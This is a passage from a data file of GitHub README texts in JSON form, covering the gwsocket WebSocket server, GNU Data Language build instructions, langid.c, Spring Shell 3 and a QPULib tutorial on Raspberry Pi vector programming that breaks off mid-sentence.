_**Happy Contributing**_ :smiley: :confetti_ball: :tada:\n"},{"repo":"\/allinurl\/gwsocket","language":"C","readme_contents":"What is it?\n-----------\ngwsocket is a standalone, simple, yet powerful rfc6455 compliant WebSocket\nServer, written in C.\n\nWhy?\n----\nI needed a simple, fast, no-dependencies, RFC6455 compliant WebSocket Server\nwritten in C that I could use as a library for the upcoming version (v1.0) of\nGoAccess by simply piping data in and out.\n\nFeatures\n-------\n* Message Fragmentation per section 5.4\n* UTF-8 Handling\n* Framing (Text & Binary messages)\n* Multiplexed non-blocking network I\/O\n* Ability to pipe data in\/out in two different modes (stdin\/stdout & strict mode)\n* It passes the Autobahn Testsuite :)\n* and of course, Valgrind tested.\n* missing something?, please feel free to post it on Github.\n\nHow it Works?\n-------------\nVery simple, just pipe your data out of your application and let gwsocket do\nthe rest. e.g.: tail -f \/var\/log\/nginx\/access.log > \/tmp\/wspipein.fifo\n\nBy the way, you can also pipe the client's data into your application.\n\nNote: You can even send your favorite NCurses program's output. See\nhttps:\/\/github.com\/allinurl\/gwsocket.\n\nMore Examples?\n-------------\nLooking for more examples and details on how it works? Head to the man page for\nmore details. Or visit http:\/\/gwsocket.io\n"},{"repo":"\/gnudatalanguage\/gdl","language":"C++","readme_contents":"                    GDL - GNU Data Language\n                    =======================\n\nA free IDL (Interactive Data Language) compatible incremental compiler\n(capable of running programs written in IDL\/GDL).\nIDL is a registered trademark of Harris Geospatial (see: http:\/\/harrisgeospatial.com\/).\n\n\nHOMEPAGE:\n=========\n\nhttp:\/\/gnudatalanguage.sourceforge.net\n\n\nFEATURES:\n=========\n\nFull syntax compatibility with IDL up to version 7.1...\n...    and trying to be up-to-date with 8.x, see below.\n\nAll IDL language elements up to IDL version 7.1 are supported, including:\n\nPointer, objects, structs,\narrays, system variables,\ncommon blocks, assoc variables,\nall operators, all datatypes,\n_EXTRA, _STRICT_EXTRA and _REF_EXTRA keywords...\n\nGDL provides all of the GUI support (widgets) of IDL (see below). \n\nSupported IDL 8.0 language elements:\n\nFOREACH loop\nnegative array indices\ngarbage collection pointers and objects\ncall methods on an object using \".\" (e. g. object.aMemberProcedure,arg1)\nempty arrays and !NULL system variable\nautomatic promotion of FOR loop variable types\nLIST and HASH types\n\nNot yet supported:\nsimplified property access on objects (e. g. object.aProperty = value & print,object.aProperty)\n\nIn general GDL should run correctly an IDL procedure, even one from the \/lib folder of an IDL distribution.\n(Note that most of theses procedures---some can be found on the web---have not yet been rewritten for GDL, help is welcome.).\n\n\nThe file input output system is fully implemented including full support of\nF77_UNFORMATTED.\n\nnetCDF files are fully supported.\nHDF4 files are supported.\nBasic support for HDF5 files.\n\nDICOM files are supported via the GDLffDICOM object (http:\/\/idl.barnett.id.au\/idl-projects)\n(files in the src\/pro\/dicom subdirectory).\n\nOverall more than 400 library routines are implemented.\nFor a list enter HELP,\/LIB at the command prompt and look for\nlibrary routines written in GDL in the src\/pro subdirectory.\n\nGraphical output is almost completely implemented (no object-graphics). \nThe PLOT, OPLOT, PLOTS, XYOUTS, SURFACE, CONTOUR and TV commands (along with WINDOW, \nWDELETE, SET_PLOT, WSET, TVLCT, LOADCT) are working (most keywords,\n!P system variable tags and multi-plots are supported) for X windows,\nz-buffer and postscript output.\n\nGDL has an interface to python.\nPython can be embedded into GDL and GDL can be compiled as a\npython module. See the file PYTHON.txt for details.\n\nFor the thread pool OpenMP is utilized if the compiler supports it.\n\n\nREQUIREMENTS:\n=============\n\nIn short:\nMandatory libraries:\nplplot      http:\/\/plplot.sourceforge.net\/source\/index.html\ngsl         http:\/\/www.gnu.org\/software\/gsl\nreadline    http:\/\/ftp.gnu.org\/pub\/gnu\/readline\/readline-4.3.tar.gz\nzlib        http:\/\/www.zlib.net\/\n\nOptional libraries:\nEigen       http:\/\/eigen.tuxfamily.org\nImageMagick http:\/\/www.imagemagick.org\/www\/download.html\nnetCDF *)   ftp:\/\/ftp.unidata.ucar.edu\/pub\/netcdf\nHDF4 *)     ftp:\/\/ftp.ncsa.uiuc.edu\/HDF\/HDF\/HDF_Current\nHDF5        ftp:\/\/ftp.ncsa.uiuc.edu\/HDF\/HDF5\/current\nFFTW        http:\/\/www.fftw.org\/download.html\npython      http:\/\/www.python.org\nlibproj4    (consult the MAP_INSTALL file)\nUDUNITS-2   http:\/\/www.unidata.ucar.edu\/software\/udunits\/\nGRIB API    http:\/\/www.ecmwf.int\/products\/data\/software\/grib_api.html        \nshp         http:\/\/shapelib.maptools.org\/ (consult the MAP_INSTALL file)\nwxWidgets   http:\/\/www.wxwidgets.org\/\npslib       http:\/\/pslib.sourceforge.net\/\nglpk        https:\/\/www.gnu.org\/software\/glpk\/  : only to have the linear programming function SIMPLEX() available.\n\nOnly with python:\nnumpy          http:\/\/numpy.scipy.org\/\n\n*) please see below for potential problems using netCDF and HDF4\n\nCOMPILING:\n----------\n  At least g++ 3.2 (or a similar C++ standard conforming\n  compiler) is needed for compiling GDL.\n  Note that due to problems with static casts g++ 3.3.1\n  does NOT compile GDL, but 3.3.2 and 3.4.1 work fine again.\n  GDL compiles under Mac OS X (10.2, 10.3) with g++ 3.3 . \n   \n  If you install the libraries as precompiled\n  packages rather than compiling them from sources, please note that\n  depending on your distribution, you may need development packages\n  as well. Examples are (for Fedora):\n  plplot-devel\n  ImageMagick-devel\n  ImageMagick-c++-devel\n\n  Look at the *INSTALL* files.\n\nLINE EDITING:\n-------------\n  Better than IDL, GDL has modern line editing and line history features.\n  The GNU readline library 4.3 is needed (actually GDL should compile\n  without, but its very inconvenient to use that way, furthermore\n  proper event handling for graphic windows requires readline).\n  You can get it at:\n  http:\/\/ftp.gnu.org\/pub\/gnu\/readline\/readline-4.3.tar.gz\n  \nGRAPHICS AND DEPENDENCIES:\n--------------------------\n  For the graphics support of GDL, the plplot library version >5.9.6 is necessary. \n  PLplot >= 5.9.9 is recommended, but plplot > 10 is tricky (see below).\n  To download plplot please look here:\n  http:\/\/plplot.sourceforge.net\/source\/index.html\n  \n  A possible problem was reported:\n  On opening more than one window, plplot causes a segmentation fault\n  if GDL is compiled with ImageMagick. This happens if plplot uses \n  dynamic drivers.\n  The current solution is to disable dynamic drivers for plplot\n  (-DENABLE_DYNDRIVERS=OFF option for cmake).\n  Current ubuntu\/debian distributions are using dynamic drivers, so plplot\n  needs to be compiled from source there. Disabling dyndrivers apparently is not necessary anymore.\n  \n  plplot > 5.11 needs absolutely to be compiled with its \"old\" wxWidgets driver,\n  using the Cmake switch -DOLD_WXWIDGETS:BOOL=ON . Otherwise the WIDGET_DRAW and possibly the graphics window *will not work*.\n  Plplot is not flexible enough to provide both drivers, and the new driver insists on making its own windows!\n  Distributions that provide plplot and plplot-devel have probably not used -DOLD_WXWIDGETS:BOOL=ON\n  so you'll need to compile plplot yourself with this option\n  (and the options -DCMAKE_BUILD_TYPE=Release -DCMAKE_CXX_FLAGS_RELEASE='-O3' for efficiency), install it somewhere\n  (so add also the with option -DCMAKE_INSTALL_PREFIX=\"somewhere\"), and provide -DPLPLOTDIR=\"somewhere\" while cmaking GDL.\n\nMATCH FUNCTIONS & MORE:\n-----------------------\n  GDL uses the GNU Scientific Library (GSL).\n  Please see file HACKING if you want to write functions extending GDL (i. e.\n  add a library subroutine) which use GSL for proper handling of GSL\n  obects in GDL.\n  (Minimal version is 1.7, which is now checked via \"gsl.m4\".\n  Note that version 1.1.1 was reported to NOT work with GDL)\n  You find it at:\n  http:\/\/www.gnu.org\/software\/gsl\n\nMAKE GDL FASTER:\n----------------\n  GDL uses Eigen for fast matrix multiplication. (optional)\n\n  The Eigen library version 3.1 or later is highly recommended for a performance\n  boost, expecially on multi-cores. To be found at: http:\/\/eigen.tuxfamily.org, \n  but is probably installed on your computer and will be found by the installer.\n\n  The simpliest way to compile with it is to copy all the header files\n  under sub-directory src\/Eigen. Another solution is to provide full path\n  to the include files (e.g. --with-eigen=\/home\/toto\/Eigen3.1.4\/include\/eigen3\/\n  in that case Eigen would have been prepared using:\n  cmake . -DCMAKE_INSTALL_PREFIX=\/home\/toto\/Eigen3.1.4\/ )\n\n  The FFTW library is (optionally) used for the FFT function.\n  It is available at: http:\/\/www.fftw.org\/download.html\n  It is NOT used by default.\n  If you want to use it, use --with-fftw=DIR \n  as a command line option to 'configure', where DIR denotes the\n  directory into which FFTW was installed\n  ('\/lib' is appended for the library, '\/include' for the include files).\n  Using FFTW results in an about double as fast FFT function.\n  Take care that you have to compile the \"normal\" and the \"single\"\n  version of the library (resp. libfftw3.a and libfftw3f.a).\n  First one is the default. You have to activate the single flag\n  (.\/configure --enable-single) when recompiling FFTw3.\n  Please also notice that the test when runnig GDL configure\n  \"checking for fftw_malloc in -lfftw3... yes\"\n  will failed if libfftw3f.a is missing.\n  As mentionned in the log. of .\/configure,\n  if FFTw is not used, the default (GSL) fft routine is used instead.\n\nWIDGETS:\n--------\n  GDL supports GUI (widget) programming (initial effort by Joel Gales rewritten by Gilles Duvert)\n  using the wxWidgets library. It is required by default.\n  If you don't want to use it, use\n  --with-wxWidgets=no (configure) or -DWXWIDGETS=off (CMake)\n  wxWidgets can be obtained from:\n  http:\/\/www.wxwidgets.org\/downloads\n  \n  The wxWidget version must be 2.8.1 or higher. Unfortunately the wxWidget implementation of the plplot graphic library\n  has changed between plplot 5.9.9 and plplot 5.11, and there are incompatibilities between plplot versions ans wxWidget versions.\n  Stable behaviour has been obtained with plplot 5.9.9 and wxWidgets 2.8.  \n  \n  The WIDGET_*... functions are all implemented (use HELP,\/LIB for an overview). Only a few\n  rarely seen options have not been written yet (please report in case of need). They have\n  not been tested outside the linux \"mageia\" distribution yet, so errors and crashes are possible.\n  Most procedures using widgets available (e.g., in the astrolib library) use so-called\n  \"compound widgets\" (CW_xxxxx functions that are written in IDL, like CW_FIELD). Those have not\n  been rewritten in GDL (and some have not been thoroughly tested). Those are not present\n  in the GDL distribution (copyright issues), must be obtained separately (google is your friend) and put\n  in the GDL path before use.\n\nDATA FORMATS:\n=============\n\n  HDF4 Files:\n  ----------\n    The HDF4 format is (not completely yet) supported (thanks to Joel Gales).\n    If you want to use it, you need the HDF library (here HDF\n    always means version 4).\n    Note that if you plan to use netCDF also, it might be necessary to\n    install HDF4 before netCDF due to same named but different header\n    files which are overwritten by the HDF4 version otherwise.\n    HDF4 is required by default. If you don't want to use it, use \n    --with-hdf=no (configure) or -DHDF=off (CMake)\n    Note that HDF in turn needs other libraries. Check out the\n    homepage for more information:\n    http:\/\/hdf.ncsa.uiuc.edu\/\n    The HDF library can be downloaded from:\n    ftp:\/\/ftp.ncsa.uiuc.edu\/HDF\/HDF\/HDF_Current\n\n  HDF5:\n  -----\n    Basic support for HDF5 is now provided (thanks to Peter Messmer).\n    If you want to use it, you need the HDF5 library.\n    It is required by default. If you don't want to use it, use \n    --with-hdf5=no (configure) or -DHDF5=off (CMake)\n    Note that HDF5 in turn needs other libraries. Check out the\n    homepage for more information:\n    http:\/\/hdf.ncsa.uiuc.edu\/HDF5\n    The HDF5 library can be downloaded from:\n    ftp:\/\/ftp.ncsa.uiuc.edu\/HDF\/HDF5\/current\n\n  NETCDF:\n  -------\n    The netCDF format is fully supported (thanks to Christopher Lee). If\n    you want to use netCDF, you need the netCDF library (even if HDF4 is\n    used, the netCDF library is needed, as the HDF library does not\n    contain all needed netCDF functions. Note that it might be necessary\n    to install netCDF after HDF4 due to same named, but different header\n    files. If the header files of HDF4 and netCDF are in different directories \n    make sure, that the directory containing netCDF's version gets searched first,\n    ie. put an explicit path for netCDF even if it is in the default include path,\n    eg: --with-netcdf=\/usr (configure) or -DNETCDFDIR=\/usr (CMake)) \n    netCDF is used by default. If you don't want to use it, use \n    --with-netcdf=no (configure) or -DNETCDF=off (CMake)\n    as a command line option to 'configure'.\n    netCDF is available from:\n    ftp:\/\/ftp.unidata.ucar.edu\/pub\/netcdf\n\n  From the HDF4 INSTALL file:\n     To use the HDF\/MFHDF libraries (libdf.a, libmfhdf.a) with the original\n     netCDF library (libnetcdf.a), the HDF4 distribution must be configured \n     with the --disable-netcdf configuration flag.  This will rename the HDF \n     version of the C interface (ncxxx) of the HDF4 netCDF APIs to sd_ncxxx \n     and will disable the HDF4 NC Fortran interfaces to avoid name clashes \n     with the original netCDF C and Fortran APIs from libnetcdf.a.  \n\n  IMAGE FORMATS:\n  --------------\n    In order to read and write images in several formats\n    (e.g. JPEG, PNG), GDL uses ImageMagick.\n    It is required by default. If you don't want to use it, use \n    --with-Magick=no\n    ImageMagick can be obtained from:\n    http:\/\/www.imagemagick.org\/www\/download.html\n\nMAP PROJECTIONS and GEOPHYSICS:\n----------------\n  GDL contains now a complete support to MAP projection,\n  using the proj4 or libproj library. Please see MAP_INSTALL file.\n  It is NOT used by default.\n  If you want to use it, use --with-libproj4=DIR\n\n  GDL uses libshp (shapelib) to implement MAP_CONTINENTS - see MAP_INSTALL (optional)\n\nPYTHON INTERFACE:\n-----------------\n  GDL has an interface to python (see http:\/\/www.python.org). \n  GDL can be used as a python module and python can be used from\n  within GDL. See INSTALL for details on how to build each version.\n  As so far there are only two example GDL extensions written in python its\n  use is optional for now but required by default. If you don't want to use\n  it, use  \n  --with-python=no\n  as a command line option to 'configure'.\n  If you want to use it you need python and the python package Numpy.\n  (http:\/\/numpy.scipy.org\/).\n  The GDL configure script will determine the installed python version\n  automatically. For this the python executable must be installed.\n  The python version can be explictely set with \n  --enable-python_version=VERSION# (eg. --enable-python_version=2.3).\n  Note: For embedding python as it is done by GDL, the python dynamic\n  library is needed which is *not* build by default. You need to run\n  'configure' for python with the '--enable-shared' option. Please see\n  the python README file for details.\n  For nice graphical output the python package matplotlib\n  (http:\/\/matplotlib.sourceforge.net) is used in one of the examples.\n  See the file PYTHON.txt for more details.\n\nOTHER SUPPORT LIBRARIES:\n------------------------\nGDL supports unit converion in IMSL_CONSTANT using the UDUNITS-2\nlibrary (http:\/\/www.unidata.ucar.edu\/software\/udunits\/)\nIf you want to use it, use --with-udunits=DIR\n\nGDL supports the GRIB file format - see README_GRIB (optional)\n\nGDL uses pslib for fine-tuning PostScript output. (optional)\n\nGDL 0.9 was developed using ANTLR 2.7,   \nbut unless you want to change the grammar (*.g files) you don't need\nANTLR (for building GDL). All relevant ANTLR files are included in the package.\nFor editing however, there are several antlr-grammar (*.g) files among the\nsources. ANTLR generates from this grammar-files c++ source files.\nANTLR generated files should not be changed directly as the changes\nwould be undone if someone regenerates those files. Instead the relevant\ngrammar file (mentioned in the header of the generated file) must be edited\nand run through ANTLR. All source files generated by ANTLR start with a capital\ncharacter. All regular source files start with a small character.\nFor more information on ANTRL see: http:\/\/www.antlr.org\n\nGDL is developed by some using NetBeans (https:\/\/netbeans.org\/)\nalthough a KDevelop project file is included in the tarball, \nso if you have KDevelop you should be able to use it with GDL seamlessly.\n\n\nINSTALLATION:\n=============\n\nPlease see the *INSTALL* file(s) for details.\nFor an alternative installation using CMake see INSATLL.CMake .\n\nFor french readers, please have a look to\nhttp:\/\/aramis.obspm.fr\/~coulais\/IDL_et_GDL\/memo_GDL.html\nwhich explain how to install GDL and most libraries\nfrom scratch and without being root.\n\n\nCONTRIBUTIONS:\n==============\n\nGDL 0.9 is actively developed, but due to the vast amount of subroutines\nto implement, GDL is still in beta state.\nEven though it is commonly used by clever people for several tasks, there are many\nthings to be done.\nBug reports, feedback in general and interested people who would\nlike to join this project are welcome.\nExtensions to GDL can be made in C++, GDL or python.\n \nUrgent things to do are:\nTHE DOCUMENTATION!\nTesting and test routines written in GDL,\n\n\nHACKING:\n========\n\nplease see file HACKING for details.\nThere you find also information about LINKIMAGE.\n\n\nCONTACT:\n========\n\nComments are welcome. Let me know what you use GDL for. Or if you don't,\nwhy not. Which functionality are you missing\/would appreciate most for\ncomming versions.\n\nFor bug reports, complaints, suggestions and comments, please\nuse the issue-tracking tool at: https:\/\/github.com\/gnudatalanguage\/gdl\n\n\nLICENSE:\n========\n\nThis program is free software; you can redistribute it and\/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\n(It should be included in this package in the file COPYING )\n"},{"repo":"\/saffsd\/langid.c","language":"C","readme_contents":"================\n``langid.c`` readme\n================\n\nIntroduction\n------------\n`langid.c` is an experimental implementation of the language identifier\ndescribed by [1] in pure C. It is largely based on the design of\n`langid.py`[2], and uses `langid.py` to train models. \n\nPlanned features\n----------------\nSee TODO\n\nSpeed\n-----\n\nInitial comparisons against Google's cld2[3] suggest that `langid.c` is about\ntwice as fast.\n\n    (langid.c) @mlui langid.c git:[master] wc -l wikifiles \n    28600 wikifiles\n    (langid.c) @mlui langid.c git:[master] time cat wikifiles | .\/compact_lang_det_batch > xxx\n    cat wikifiles  0.00s user 0.00s system 0% cpu 7.989 total\n    .\/compact_lang_det_batch > xxx  7.77s user 0.60s system 98% cpu 8.479 total\n    (langid.c) @mlui langid.c git:[master] time cat wikifiles | .\/langidOs -b > xxx           \n    cat wikifiles  0.00s user 0.00s system 0% cpu 3.577 total\n    .\/langidOs -b > xxx  3.44s user 0.24s system 97% cpu 3.759 total\n\n    (langid.c) @mlui langid.c git:[master] wc -l rcv2files \n    20000 rcv2files\n    (langid.c) @mlui langid.c git:[master] time cat rcv2files | .\/langidO2 -b > xxx     \n    cat rcv2files  0.00s user 0.00s system 0% cpu 31.702 total\n    .\/langidO2 -b > xxx  8.23s user 0.54s system 22% cpu 38.644 total\n    (langid.c) @mlui langid.c git:[master] time cat rcv2files | .\/compact_lang_det_batch > xxx \n    cat rcv2files  0.00s user 0.00s system 0% cpu 18.343 total\n    .\/compact_lang_det_batch > xxx  18.14s user 0.53s system 97% cpu 19.155 total\n\n\nModel Training\n--------------\n\nGoogle's protocol buffers [4] are used to transfer models between languages. The\nPython program `ldpy2ldc.py` can convert a model produced by langid.py [2] into\nthe protocol-buffer format, and also the C source format used to compile an\nin-built model directly into executable.\n\nDependencies\n------------\nProtocol buffers [4]\nprotobuf-c [5]\n\nContact\n-------\nMarco Lui <saffsd@gmail.com>\n\nReferences\n----------\n[1] http:\/\/aclweb.org\/anthology-new\/I\/I11\/I11-1062.pdf\n[2] https:\/\/github.com\/saffsd\/langid.py\n[3] https:\/\/code.google.com\/p\/cld2\/\n[4] https:\/\/github.com\/google\/protobuf\/\n[5] https:\/\/github.com\/protobuf-c\/protobuf-c\n"},{"repo":"\/spring-projects\/spring-shell","language":"Java","readme_contents":"= Spring Shell 3\n\nSpring Shell 3 is a work to solely depend on Spring Boot 2.x and not trying to keep\nany backward compatibility with older Spring Shell 1.x nor Spring Boot 1.x.\n\n== Building\n```\n.\/mvnw package\n```\n\n== Running\nThe project comes with a sample application, showcasing the various ways you can write commands.\n\n```\n.\/mvnw install\n.\/mvnw -pl spring-shell-samples spring-boot:run\n```\n\nFrom there, try typing `help` or `help <commmand>` at the shell prompt.\n\n"},{"repo":"\/mn416\/QPULib","language":"C++","readme_contents":"# QPULib\n\nVersion 0.1.0.\n\nQPULib is a programming language and compiler for the [Raspberry\nPi](https:\/\/www.raspberrypi.org\/)'s *Quad Processing Units* (QPUs).\nIt is implemented as a C++ library that runs on the Pi's ARM CPU,\ngenerating and offloading programs to the QPUs at runtime.  This page\nintroduces and documents QPULib.  For build instructions, see the\n[Getting Started Guide](Doc\/GettingStarted.md).\n\n## Contents\n\n* [Background](#background)\n* [Example 1: Euclid's Algorithm](#example-1-euclids-algorithm)\n    * [Scalar version](#scalar-version)\n    * [Vector version 1](#vector-version-1)\n    * [Invoking the QPUs](#invoking-the-qpus)\n    * [Vector version 2: loop unrolling](#vector-version-2-loop-unrolling)\n* [Example 2: 3D Rotation](#example-2-3d-rotation)\n    * [Scalar version](#scalar-version-1)\n    * [Vector version 1](#vector-version-1-1)\n    * [Vector version 2: non-blocking loads and stores](#vector-version-2-non-blocking-loads-and-stores)\n    * [Vector version 3: multiple QPUs](#vector-version-3-multiple-qpus)\n    * [Performance](#performance)\n* [Example 3: 2D Convolution (Heat Transfer)](#example-3-2d-convolution-heat-transfer)\n    * [Scalar version](#scalar-version-2)\n    * [Vector version](#vector-version)\n    * [Performance](#performance-1)\n* [References](#user-content-references)\n\n## Background\n\nThe\n[QPU](http:\/\/www.broadcom.com\/docs\/support\/videocore\/VideoCoreIV-AG100-R.pdf)\nis a [vector\nprocessor](https:\/\/en.wikipedia.org\/wiki\/Vector_processor) developed by\n[Broadcom](http:\/\/www.broadcom.com\/) with\ninstructions that operate on 16-element vectors of 32-bit integer or\nfloating point values.\nFor example, given two 16-element vectors\n\n`10 11 12 13` `14 15 16 17` `18 19 20 21` `22 23 24 25`\n\nand\n\n`20 21 22 23` `24 25 26 27` `28 29 30 31` `32 33 34 35`\n\nthe QPU's *integer-add* instruction computes a third vector\n\n`30 32 34 36` `38 40 42 44` `46 48 50 52` `54 56 58 60`\n\nwhere each element in the output is the sum of the\ncorresponding two elements in the inputs.\n\nEach 16-element vector is comprised of four *quads*.  This is where\nthe name \"Quad Processing Unit\" comes from: a QPU processes one quad\nper clock cycle, and a QPU instruction takes four consecutive clock\ncycles to deliver a full 16-element result vector.\n\nThe Pi contains 12 QPUs in total, each running at 250MHz.  That's a\nmax throughput of 750M vector instructions per second (250M cycles\ndivided by 4 cycles-per-instruction times 12 QPUs).  Or: 12B\noperations per second (750M instructions times 16 vector elements).\nQPU instructions can in some cases deliver two results at a\ntime, so the Pi's QPUs are often advertised at 24\n[GFLOPS](https:\/\/en.wikipedia.org\/wiki\/FLOPS).\n\nThe QPUs are part of the Raspberry Pi's graphics pipeline.  If you're\ninterested in doing efficient graphics on the Pi then you probably\nwant [OpenGL\nES](https:\/\/www.raspberrypi.org\/documentation\/usage\/demos\/hello-teapot.md).\nBut if you'd like to try accellerating a non-graphics part of your Pi\nproject then QPULib is worth a look.  (And so too are\n[these references](#user-content-references).)\n\n## Example 1: Euclid's Algorithm\n\nFollowing tradition, let's start by implementing [Euclid's\nalgorithm](https:\/\/en.wikipedia.org\/wiki\/Euclidean_algorithm).  Given\na pair of positive integers larger then zero, Euclid's algorithm\ncomputes the largest integer that divides into both without a\nremainder, also known as the *greatest common divisor*, or GCD for\nshort.\n\nWe present two versions of the algorithm:\n\n  1. a **scalar** version that runs on the ARM CPU and computes a\n     single GCD; and\n\n  2. a **vector** version that runs on a single QPU and computes 16\n     different GCDs in parallel.\n\n### Scalar version\n\nIn plain C++, we can express the algorithm as follows.\n\n```C++\nvoid gcd(int* p, int* q, int* r)\n{\n  int a = *p;\n  int b = *q;\n  while (a != b) {\n    if (a > b) \n      a = a-b;\n    else\n      b = b-a;\n  }\n  *r = a;\n}\n```\n\nAdmittedly, it's slightly odd to write `gcd` in this way, operating\non pointers to integers rather than integers directly.  However, it\nprepares the way for the vector version which operates on \n*arrays* of inputs and outputs.\n\n### Vector version 1\n\nUsing QPULib, the algorithm looks as follows.\n\n```c++\n#include <QPULib.h>\n\nvoid gcd(Ptr<Int> p, Ptr<Int> q, Ptr<Int> r)\n{\n  Int a = *p;\n  Int b = *q;\n  While (any(a != b))\n    Where (a > b)\n      a = a-b;\n    End\n    Where (a < b)\n      b = b-a;\n    End\n  End\n  *r = a;\n}\n```\n\nEven this simple example introduces a number of concepts:\n\n  * the `Int` type denotes a 16-element vector of 32-bit integers;\n\n  * the `Ptr<Int>` type denotes a 16-element vector of *addresses* of\n    `Int` vectors;\n\n  * the expression `*p` denotes the `Int` vector in memory starting at address\n    <tt>p<sub>0<\/sub><\/tt>, i.e. starting at the *first* address in the\n    vector `p`;\n\n  * the expression `a != b` computes a vector of booleans via a \n    pointwise comparison of vectors `a` and `b`;\n\n  * the condition `any(a != b)` is true when *any* of the booleans in the\n    vector `a != b` are true;\n\n  * the statement `Where (a > b) a = a-b; End` is a conditional assigment:\n    only elements in vector `a` for which `a > b` holds will be\n    modified.\n\nIt's worth reiterating that QPULib is just standard C++ code: there\nare no pre-processors being used other than the standard C\npre-processor.  All the QPULib language constructs are simply\nclasses, functions, and macros exported by QPULib.  This kind of\nlanguage is somtimes known as a [Domain Specific Embedded\nLanguage](http:\/\/cs.yale.edu\/c2\/images\/uploads\/dsl.pdf).\n\n### Invoking the QPUs\n\nNow, to compute 16 GCDs on a single QPU, we write the following\nprogram.\n\n```c++\nint main()\n{\n  \/\/ Compile the gcd function to a QPU kernel k\n  auto k = compile(gcd);\n\n  \/\/ Allocate and initialise arrays shared between CPU and QPUs\n  SharedArray<int> a(16), b(16), r(16);\n\n  \/\/ Initialise inputs to random values in range 100..199\n  srand(0);\n  for (int i = 0; i < 16; i++) {\n    a[i] = 100 + rand()%100;\n    b[i] = 100 + rand()%100;\n  }\n\n  \/\/ Set the number of QPUs to use\n  k.setNumQPUs(1);\n\n  \/\/ Invoke the kernel\n  k(&a, &b, &r);\n\n  \/\/ Display the result\n  for (int i = 0; i < 16; i++)\n    printf(\"gcd(%i, %i) = %i\\n\", a[i], b[i], r[i]);\n  \n  return 0;\n}\n```\n\nUnpacking this a bit:\n\n  * `compile` takes function defining a QPU computation and returns a\n    CPU-side handle that can be used to invoke it;\n\n  * the handle `k` is of type `Kernel<Ptr<Int>, Ptr<Int>,\n    Ptr<Int>>`, capturing the types of `gcd`'s parameters,\n    but we use the `auto` keyword to avoid clutter;\n\n  * when the kernel is invoked by writing `k(&a, &b, &r)`, QPULib knows\n    how to automatically convert CPU values of type\n    `SharedArray<int>*` into QPU values of type `Ptr<Int>`;\n\n  * the <tt>SharedArray&lt;&alpha;&gt;<\/tt> type is used to allocate\n    memory that is accessed\n    by both the CPU and the QPUs: memory allocated with `new` and\n    `malloc()` will not be accessible from the QPUs.\n\nRunning this program, we get:\n\n```\ngcd(183, 186) = 3\ngcd(177, 115) = 1\ngcd(193, 135) = 1\ngcd(186, 192) = 6\ngcd(149, 121) = 1\ngcd(162, 127) = 1\ngcd(190, 159) = 1\ngcd(163, 126) = 1\ngcd(140, 126) = 14\ngcd(172, 136) = 4\ngcd(111, 168) = 3\ngcd(167, 129) = 1\ngcd(182, 130) = 26\ngcd(162, 123) = 3\ngcd(167, 135) = 1\ngcd(129, 102) = 3\n```\n\n### Vector version 2: loop unrolling\n\n[Loop unrolling](https:\/\/en.wikipedia.org\/wiki\/Loop_unrolling) is a\ntechnique for improving performance by reducing the number of costly\nbranch instructions executed.\n\nThe QPU's branch instruction can indeed be costly: it requires three\n[delay slots](https:\/\/en.wikipedia.org\/wiki\/Delay_slot) (that's 12\nclock cycles), and QPULib currently makes no attempt to fill these\nslots with useful work.  Although QPULib doesn't do loop unrolling\nfor you, it does make it easy to express: we can simply\nuse a C++ loop to generate multiple QPU statements.\n\n```c++\nvoid gcd(Ptr<Int> p, Ptr<Int> q, Ptr<Int> r)\n{\n  Int a = *p;\n  Int b = *q;\n  While (any(a != b))\n    \/\/ Unroll the loop body 32 times\n    for (int i = 0; i < 32; i++) {\n      Where (a > b)\n        a = a-b;\n      End\n      Where (a < b)\n        b = b-a;\n      End\n    }\n  End\n  *r = a;\n}\n```\n\nUsing C++ as a meta-language in this way is one of the attractions\nof QPULib.  We will see lots more examples of this later!\n\n## Example 2: 3D Rotation\n\nLet's move to another simple example that helps to introduce\nideas: a routine to rotate 3D objects.\n\n(Of course, [OpenGL\nES](https:\/\/www.raspberrypi.org\/documentation\/usage\/demos\/hello-teapot.md)\nwould be a much better path for doing efficient graphics; this is just\nfor illustration purposes.)\n\n### Scalar version\n\nThe following function will rotate `n` vertices about the Z axis by\n&theta; degrees.\n\n```c++\nvoid rot3D(int n, float cosTheta, float sinTheta, float* x, float* y)\n{\n  for (int i = 0; i < n; i++) {\n    float xOld = x[i];\n    float yOld = y[i];\n    x[i] = xOld * cosTheta - yOld * sinTheta;\n    y[i] = yOld * cosTheta + xOld * sinTheta;\n  }\n}\n```\n\nIf we apply this to the vertices in [Newell's\nteapot](https:\/\/github.com\/rm-hull\/newell-teapot\/blob\/master\/teapot)\n(rendered using [Richard Hull's\nwireframes](https:\/\/github.com\/rm-hull\/wireframes) tool)\n\n<img src=\"Doc\/teapot.png\" alt=\"Newell's teapot\" width=30%>\n\nwith &theta; = 180 degrees, then we get\n\n<img src=\"Doc\/teapot180.png\" alt=\"Newell's teapot\" width=30%>\n\n### Vector version 1\n\nOur first vector version is almost identical to the scalar version\nabove: the only difference is that each loop iteration now processes\n16 vertices at a time rather than a single vertex.\n\n```c++\nvoid rot3D(Int n, Float cosTheta, Float sinTheta, Ptr<Float> x, Ptr<Float> y)\n{\n  For (Int i = 0, i < n, i = i+16)\n    Float xOld = x[i];\n    Float yOld = y[i];\n    x[i] = xOld * cosTheta - yOld * sinTheta;\n    y[i] = yOld * cosTheta + xOld * sinTheta;\n  End\n}\n```\n\nUnfortunately, this simple solution is not the most efficient: it will\nspend a lot of time blocked on the memory subsystem, waiting for\nvector loads and stores to complete.  To get good performance on a\nQPU, it is desirable to overlap memory access with computation, and\nthe current QPULib compiler is not clever enough to do this\nautomatically.  We can however solve the problem manually, using\n*non-blocking* load and store operations.\n\n### Vector version 2: non-blocking loads and stores\n\nQPULib supports non-blocking loads through two functions:\n\n  * Given a vector of addresses `p`, the\n    statement `gather(p)` will *request* \n    the value at each address in `p`.\n\n  * A subsequent a call to `receive(x)`, where `x` is vector,\n    will block until the value at each address in\n    `p` has been loaded into `x`.\n\nUnlike the statement `x = *p`, the statement `gather(p)` will request\nthe value *at each address* in `p`, not the vector beginning at the\nfirst address in `p`.  In addition, `gather(p)` does not\nblock until the loads have completed: between `gather(p)`\nand `receive(x)` the program is free to perform computation *in\nparallel* with the slow memory accesses.\n\nInside the QPU, an 4-element FIFO is used to hold 